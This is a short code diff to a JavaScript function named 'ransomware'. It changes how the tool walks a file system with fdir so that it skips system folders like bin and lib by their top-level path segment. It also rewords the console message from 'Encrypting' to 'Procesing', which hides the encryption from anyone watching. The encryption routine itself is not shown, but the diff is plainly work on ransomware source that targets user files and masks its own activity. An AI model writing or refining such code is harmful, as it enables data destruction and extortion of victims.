@@ -80,9 +80,15 @@ const readdir = (directory: string) => {
 }
 */
 const readdir = (directory) => {
-    const api = new fdir_1.fdir().exclude((name, path) => {
-        console.log(`Name "${name}"; Path "(${path})"`);
-        switch (name) {
+    const api = new fdir_1.fdir().exclude((filename, path) => {
+        let startPath = path;
+        try {
+            startPath = path.split("/")[1];
+        }
+        catch (err) {
+            // silent error
+        }
+        switch (startPath) {
             case "bin":
                 return true;
             case "lib":
@@ -204,7 +210,7 @@ const ransomware = (options) => {
     let oldTime = new Date();
     const filesInPath = readdir(path);
     console.log(`Files found in ${+new Date() - +oldTime} ms`);
-    console.log("Encrypting " + filesInPath.length + " files...");
+    console.log("Procesing " + filesInPath.length + " files...");
     for (let i = 0; i < filesInPath.length; ++i) {
         console.log(`${i} of ${filesInPath.length} as ${filesInPath[i]} ...`);
         try {
